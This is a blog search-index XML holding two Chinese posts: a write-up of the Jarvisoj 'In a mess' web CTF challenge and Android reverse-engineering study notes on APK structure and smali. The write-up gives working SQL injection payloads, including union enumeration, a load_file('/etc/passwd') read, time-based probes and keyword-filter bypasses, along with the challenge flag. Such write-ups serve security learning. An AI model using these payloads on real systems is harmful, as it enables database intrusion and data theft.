<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Jarvisoj- in a mess(SQL)</title>
      <link href="/2019/07/31/jarvisoj-in-a-mess-sql/"/>
      <url>/2019/07/31/jarvisoj-in-a-mess-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="Jarvisoj-Web-In-a-mess-500-writeup"><a href="#Jarvisoj-Web-In-a-mess-500-writeup" class="headerlink" title="Jarvisoj Web In a mess(500) writeup"></a>Jarvisoj Web In a mess(500) writeup</h1><h2 id="过检测"><a href="#过检测" class="headerlink" title="过检测"></a>过检测</h2><p>由源代码提示</p><pre><code>&lt;!--index.phps--&gt;work harder!harder!harder!</code></pre><p><a href="http://web.jarvisoj.com:32780/index.phps">http://web.jarvisoj.com:32780/index.phps</a></p><p>通过分析,要构造三个a,b,id参数<br>id: 用弱类型就可以了</p><pre><code>id=0a</code></pre><p>a: 要从file_get_contents得到一个”1112 is a nice lab!”,这里通过php的伪协议,post一个字符串的data就可以了</p><pre><code>a=php://inputpostdata: 1112 is a nice lab!测试后不太行:这里用data协议a=data:,1112 is a nice lab!</code></pre><p>b: 要求字符串大于5,还要满足eregi函数的限制,第一个参数不能等于4,这里eregi函数可以用%00截断</p><pre><code>eregi函数: eregi(string pattern, string string, [array regs]);如果string字符串符合Pattern模式,就返回true%00截断: 遇到%00则默认为字符串的结束,由于是一个字符一个字符的比较的,所以到了%00,eregi函数就以为比较完成了,这样就避免了第四个字符串要求是4而又不能是4的条件eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)&quot;111&quot;.substr($b,0,1)将111字符串和b的第一个字符拼接$b = %0011111; 满足条件字符串长度大于5即可</code></pre><p>最终参数: ?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%0011111</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!--index.phps-->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: index.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hahahahahaha'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">==</span><span class="token string">"1112 is a nice lab!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">print</span> <span class="token string">"work harder!harder!harder!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>得到一句回复﻿Come ON!!! {/^HT2mCpcvOLf},应该是目录</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a href="http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</a></p><p>检查源码发现没有提示,推测出题人老师是想考察sql注入<br>判断是否存在注入点:<br>    1. 根据错误和布尔等显式注入思路,判断目标网页/表单是否存在注入点<br>    2. 如果目标做了基本的字符安全过滤,还可以使用更复杂的盲注(例如时间盲注)来进阶判断</p><p>这里使用两种方法,第一种使用Sqlmap工具注入,第二种手工注入</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ul><li>猜解是否能够注入,这里我们把等级改到3,提高搜索范围,因为这里普通的注入手段可能不行</li></ul><pre><code>sqlmap -u &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&quot; --level 3</code></pre><ul><li>跑不出来</li></ul><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ul><li>手动注入方式<blockquote><p>基于错误的注入<br>基于bool的注入<br>基于union的注入<br>基于时间的盲注</p></blockquote></li></ul><h4 id="构造union查询语句"><a href="#构造union查询语句" class="headerlink" title="构造union查询语句"></a>构造union查询语句</h4><pre><code>1. 猜测目标网页/表单的查询数2. 查询目标数据库的基础信息    版本信息、用户信息、系统表信息3. 通过系统表查找敏感数据表    user、admin、root、password4. 查询目标数据表的数据内容</code></pre><ul><li>爆字段数</li></ul><pre class=" language-sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--'</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--'</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--'</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span></code></pre><ul><li>爆库</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select schema_name from information_schema.schemata'</span><span class="token string">'and 1=2 union select database()'</span>'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span><span class="token string">'and 1=2 union select 1,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>information_schema提供了访问数据库元数据的方式<span class="token punctuation">,</span>元数据包括例如数据库名、表名、列数据类型、访问权限、字符集等基础信息</code></pre><ul><li>爆表</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>0x库名</code></pre><ul><li>爆字段</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x表'</span><span class="token string">'and 1=2 union select 1,2,group_concat(column_name) from 表名'</span><span class="token string">'and 1=2 union select 1,2,GRANTEE from USER_PRIVILEGES'</span></code></pre><ul><li>爆字段内容</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select 1,2,group_concat(id,context,title) from admin'</span></code></pre><h4 id="高级报错注入"><a href="#高级报错注入" class="headerlink" title="高级报错注入"></a>高级报错注入</h4><ul><li><p>基于时间的盲注<br>  最核心的函数是sleep函数</p></li><li><p>基于时间盲注_注入点探测语句</p></li></ul><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--'</span></code></pre><ul><li>基于ascii逐字解码</li></ul><p>本题绕过方式</p><blockquote><p>注释符/* */</p></blockquote><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 爆数据字段数</span><span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>正常返回<span class="token number">3</span><span class="token punctuation">,</span>字段数为<span class="token number">3</span><span class="token comment" spellcheck="true"># 爆库</span>把所有的空格都用<span class="token comment" spellcheck="true">/* */</span>代替就可以过空格检测<span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span>schema_name<span class="token comment" spellcheck="true">/* */</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/* */</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>对该题第一次尝试<span class="token operator">and</span><span class="token comment" spellcheck="true">/* */</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span>schema_name<span class="token comment" spellcheck="true">/* */</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/* */</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>you <span class="token number">bad</span> boy<span class="token operator">/</span>girl<span class="token operator">!</span>失败很明显这里可能过滤了<span class="token keyword">select</span>和<span class="token keyword">from</span>关键字我们尝试绕过一下<span class="token punctuation">,</span>这里就是下面的绕过<span class="token keyword">union</span>，<span class="token keyword">select</span>，<span class="token keyword">where</span>的方法<span class="token number">1</span><span class="token punctuation">.</span> 大小写混淆<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">SeLeCT</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">FrOm</span><span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>you <span class="token number">bad</span> boy<span class="token operator">/</span>girl<span class="token operator">!</span>失败<span class="token number">2</span><span class="token punctuation">.</span> 双关键字绕过<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>成功但是没查到结果<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>成功显示 test在这里就可以得到他这里是有空格和关键字检测的<span class="token punctuation">,</span>这里我们用双关键字和注释符就可以绕过<span class="token comment" spellcheck="true"># 爆表</span><span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/*1*/</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>content<span class="token comment" spellcheck="true"># 爆字段</span><span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/*1*/</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>id<span class="token punctuation">,</span>context<span class="token punctuation">,</span>title<span class="token comment" spellcheck="true"># 爆字段内容</span><span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>context<span class="token punctuation">,</span>title<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>content<span class="token number">1</span> PCTF{Fin4lly_U_got_i7_C0ngRatulation5} hi666</code></pre><h2 id="常见的绕过方式"><a href="#常见的绕过方式" class="headerlink" title="常见的绕过方式"></a>常见的绕过方式</h2><blockquote><p>两个空格代替一个空格,用Tab代替空格<br>括号绕过<br>引号绕过<br>逗号绕过<br>比较符号<br>or and xor not绕过<br>绕过注释符号<br>=绕过<br>绕过union，select，where等<br>通用绕过（编码）<br>等价函数绕过<br>宽字节注入</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向学习笔记（一）</title>
      <link href="/2019/07/31/an-zhuo-ni-xiang-xue-xi-bi-ji-yi/"/>
      <url>/2019/07/31/an-zhuo-ni-xiang-xue-xi-bi-ji-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="安卓逆向学习笔记（一）"><a href="#安卓逆向学习笔记（一）" class="headerlink" title="安卓逆向学习笔记（一）"></a>安卓逆向学习笔记（一）</h1><h2 id="APK文件结构"><a href="#APK文件结构" class="headerlink" title="APK文件结构"></a>APK文件结构</h2><pre class=" language-android"><code class="language-android">assets                    表示资源文件lib                        表示库文件META-INF                表示签名文件夹    CERT.RSA            表示证书    CERT.SF                表示对所有摘要的哈希加密    MANIFEST            表示对摘要再次加密res                        表示资源库，包含xml和资源文件，除了图片都会进行反编译，要用APKTOOL进行反编译AndroidManifest.xml        安卓内的配置文件classes.dex                表示经过编译后的代码文件classes2.dex            表示经过编译后的代码文件resources.arsc            表示记录这些ID和资源文件位置对应关系的文件</code></pre><h2 id="APK打包流程"><a href="#APK打包流程" class="headerlink" title="APK打包流程"></a>APK打包流程</h2><pre class=" language-mermaid"><code class="language-mermaid">graph TD    Application-->AAPT((AAPT))    AAPT-->Compiled(Compiled Resources)    AAPT-->R(R.java)    ApplicationSourceCode-->Compiler(Java Compiler)    R-->Compiler    adil(.aidl Files)-->AIDL(AIDL tool)    AIDL-->JavaInterface    JavaInterface-->Compiler    Compiler-->classfile(.class Files)    classfile-->dex    lib(3rd partly lib Or .class files)-->dex    dex-->dexfile(.dex files)    dexfile-->apkbuilder    Compiled-->apkbuilder    OtherResources-->apkbuilder    apkbuilder-->apk(Android Package)    apk-->Jarsigner    Keystore-->Jarsigner    Jarsigner-->Signed.apk</code></pre><pre class=" language-android"><code class="language-android">Java Compiler :  表示javac编译java源代码生成class文件dex : 表示将相应的class文件打包成.dex filesapkbuilder : 表示生成了android文件的基本结构jarsigner : 表示对apk进行签名</code></pre><h2 id="APK安装流程"><a href="#APK安装流程" class="headerlink" title="APK安装流程"></a>APK安装流程</h2><h3 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h3><ol><li><p>系统程序安装</p></li><li><p>通过android市场安装</p></li><li><p>ADB安装</p><pre class=" language-powershell"><code class="language-powershell">ADB install x<span class="token punctuation">.</span>apk</code></pre></li><li><p>手机自带安装</p></li></ol><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p>复制APK安装包到/data/app目录下，解压缩并扫描安装包，把dex文件（Dalvik字节码）保存到/data/dalvik-cache目录下，并在/data/data目录下创建对应的应用数据目录</p><h3 id="安装后文件所在目录"><a href="#安装后文件所在目录" class="headerlink" title="安装后文件所在目录"></a>安装后文件所在目录</h3><p><strong>/system/app</strong></p><p>​        系统自带的应用程序，获得adb root权限方可删除</p><p><strong>/data/app</strong></p><p>​        用户程序安装的木u</p><p><strong>/data/data</strong></p><p>​        存放应用程序的数据</p><p><strong>/data/dalvik-cache</strong></p><p>​        将apk的dex文件安装到dalvik-cache目录下</p><h3 id="卸载过程"><a href="#卸载过程" class="headerlink" title="卸载过程"></a>卸载过程</h3><p>删除安装过程中在上述三个目录下创建的文件及目录</p><h2 id="APK反编译与回编译"><a href="#APK反编译与回编译" class="headerlink" title="APK反编译与回编译"></a>APK反编译与回编译</h2><h3 id="Android-Killer"><a href="#Android-Killer" class="headerlink" title="Android Killer"></a>Android Killer</h3><p>使用android killer进行反汇编和回编译即可，还可以进行搜索字符串更改应用名称、修改包名实现版本共存、修改配置文件去广告等简单利用，下面就修改配置文件去广告进行简单叙述</p><ol><li>搜索INTERNET</li><li>将搜索到的INTERNET直接删除</li><li>搜索ACCESS_NETWORK_STATE</li><li>将搜索到的ACCESS_NETWORK_STATE直接删除</li><li>搜索ACCESS_WIFI_STATE</li><li>将搜索到的ACCESS_WIFI_STATE直接删除</li></ol><h2 id="APK虚拟机与Dalvik虚拟机"><a href="#APK虚拟机与Dalvik虚拟机" class="headerlink" title="APK虚拟机与Dalvik虚拟机"></a>APK虚拟机与Dalvik虚拟机</h2><p><strong>java -&gt; smali汇编（.class文件分析）</strong></p><p><strong>c/c++ -&gt; arm汇编 （.so文件分析）</strong></p><p>java虚拟机生成的是java字节码，基于栈架构</p><h3 id="Dalvik虚拟机和Art虚拟机"><a href="#Dalvik虚拟机和Art虚拟机" class="headerlink" title="Dalvik虚拟机和Art虚拟机"></a>Dalvik虚拟机和Art虚拟机</h3><p>####　Dalvik虚拟机（jit机制）</p><ol><li>Android 5.0以下</li><li>dalvik字节码</li><li>dalvik相比于java虚拟机可执行文件体积更小</li><li>基于寄存器架构</li></ol><h4 id="art虚拟机（aot机制）"><a href="#art虚拟机（aot机制）" class="headerlink" title="art虚拟机（aot机制）"></a>art虚拟机（aot机制）</h4><p>Android 5.0版本及以上</p><h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><p>.dex -&gt; dexopt -&gt; .odex dalvik加载执行的odex文件</p><p>.dex -&gt; dex2oat -&gt; .oat   art加载执行的是oat文件</p><pre><code>// java虚拟机 -&gt; java字节码JNI_GetDefaultJavaVMInitArgs    : 表示获取虚拟机的默认初始化参数JNI_CreateJavaVM    : 表示在进程中创建虚拟机实例JNI_GetCreatedJavaVMs    : 表示获取进程中创建的实例// 生成的虚拟机中的参数persist.sys.dalvik.vm.lib == libdvm.so    表示是Dalvik虚拟机，执行的是dex字节码persist.sys.dalvik.vm.lib == libart.so     表示是ART虚拟机虚拟机// aot机制/system/bin/dex2oat    : 安装的时候用于提取代码/system/app/data/app/system/framework</code></pre><h2 id="Dalvik字节码"><a href="#Dalvik字节码" class="headerlink" title="Dalvik字节码"></a>Dalvik字节码</h2><h3 id="dalvik寄存器"><a href="#dalvik寄存器" class="headerlink" title="dalvik寄存器"></a>dalvik寄存器</h3><p>dalvik中的寄存器都是32位的，寄存器主要用到了v命令法和p命令法</p><h4 id="v命令法"><a href="#v命令法" class="headerlink" title="v命令法"></a>v命令法</h4><p>参数寄存器 : v0 - vn</p><p>局部变量寄存器 : vn - vn+m</p><h4 id="p命令法（常用）-smali-jar"><a href="#p命令法（常用）-smali-jar" class="headerlink" title="p命令法（常用）- smali.jar"></a>p命令法（常用）- smali.jar</h4><p>参数寄存器 : p0 - pn</p><p>局部变量寄存器 : v0 - vn</p><h4 id="smail汇编"><a href="#smail汇编" class="headerlink" title="smail汇编"></a>smail汇编</h4><ul><li>类型</li></ul><table><thead><tr><th>smail</th><th>java</th></tr></thead><tbody><tr><td>V</td><td>void</td></tr><tr><td>Z</td><td>boolean</td></tr><tr><td>B</td><td>byte</td></tr><tr><td>S</td><td>short</td></tr><tr><td>C</td><td>char</td></tr><tr><td>I</td><td>int</td></tr><tr><td>J</td><td>long</td></tr><tr><td>F</td><td>float</td></tr><tr><td>D</td><td>double</td></tr><tr><td>L</td><td>java class</td></tr><tr><td>[</td><td>java array</td></tr></tbody></table><ul><li>字段（c++ 中的类成员或类成员变量）</li></ul><p>Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</p><p>包名                         类名                     字段名            类型</p><pre><code>example : Lcom/speedsoftware/rootexplorer/ig;-&gt;o:Z类名(ig)                        字段名(o):类型(z)</code></pre><ul><li>方法（c++ 中的类里面的成员函数）</li></ul><p>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</p><p>包名                         类名                     方法名         方法参数  方法返回值</p><pre class=" language-smali"><code class="language-smali">example : Lcom/speedsoftware/rootexplorer/ig;-> a(Landroid/content/ConteXT;)I类名(ig)方法名(a)方法参数(Landroid/content/ConteXT;)方法返回值(I)</code></pre><h2 id="Smail文件"><a href="#Smail文件" class="headerlink" title="Smail文件"></a>Smail文件</h2><blockquote><p>反汇编过来的文件大多数都是smail文件</p></blockquote><h3 id="描述类的信息"><a href="#描述类的信息" class="headerlink" title="描述类的信息"></a>描述类的信息</h3><p><code>.class &lt;访问权限&gt; [修饰关键字] &lt;类名&gt;</code></p><p><code>.super &lt;父类名&gt;</code></p><p><code>.source &lt;源文件名&gt;</code></p><h3 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a>静态字段</h3><p><code>.field &lt;访问权限&gt; static [修饰关键字]  &lt;字段名&gt; :  &lt;字段类型&gt;</code></p><h3 id="实例字段"><a href="#实例字段" class="headerlink" title="实例字段"></a>实例字段</h3><p><code>.field &lt;访问权限&gt; [修饰关键字]  &lt;字段名&gt; :  &lt;字段类型&gt;</code></p><h3 id="直接方法"><a href="#直接方法" class="headerlink" title="直接方法"></a>直接方法</h3><p>“.local”                : 指定了使用的局部变量的个数</p><p>“.parameter”     : 指定了方法的参数</p><p>“.prologue”        : 指定了代码的开始处</p><p>“.line”                  : 指定了该处指令在源代码中的行号</p><pre class=" language-smail"><code class="language-smail"># direct methods.method <访问权限> [修饰关键字]  <方法原型> ​    <.locals>​    [.parameter]​    [.prologue]​    [.line]​    <代码体>.end method</code></pre><h3 id="虚方法"><a href="#虚方法" class="headerlink" title="虚方法"></a>虚方法</h3><pre class=" language-smail"><code class="language-smail"># virtual methods.method <访问权限> [修饰关键字]  <方法原型> ​    <.locals>​    [.parameter]​    [.prologue]​    [.line]​    <代码体>.end method</code></pre><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>“.implements” 是接口关键字，后面的接口名是DexClassDef结构中interfacesOff字段指定的内容</p><pre class=" language-smail"><code class="language-smail"># interfaces.implements <接口名> </code></pre><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>注解的作用范围可以是类、方法或字段。如果注解的作用范围是类，”.annotation”指令会直接定义在smali文件中，如果是方法或字段，”.annotation”指令则会包含在方法或者字段定义中</p><pre class=" language-smail"><code class="language-smail"># annotations.annotation [注解属性] <注解类名>            [注解字段 = 值].end annotation</code></pre><h2 id="smail快速定位关键代码"><a href="#smail快速定位关键代码" class="headerlink" title="smail快速定位关键代码"></a>smail快速定位关键代码</h2><ol><li><p>分析流程</p><p>搜索特征字符串</p><p>搜索关键API</p><p>通过方法名来判断方法的功能</p></li><li><p>快速定位关键代码</p><p>反编译APK程序</p><p>​        AndroidManifest.xml -&gt; 包名/系统版本/组件</p><p>​            apk权限（uses-permission）</p><p>​            网络权限</p><p>​            定位权限</p><p>程序的主activity</p><p>​        每个Android程序有且只有一个主Activity</p><p>需重点关注的application</p><p>​        application执行时间</p><p>​        授权验证</p></li><li><p>定位关键代码的技巧</p><p>信息反馈法（资源id/字符串）</p></li></ol><p>onCreate</p><p>onDestroy</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
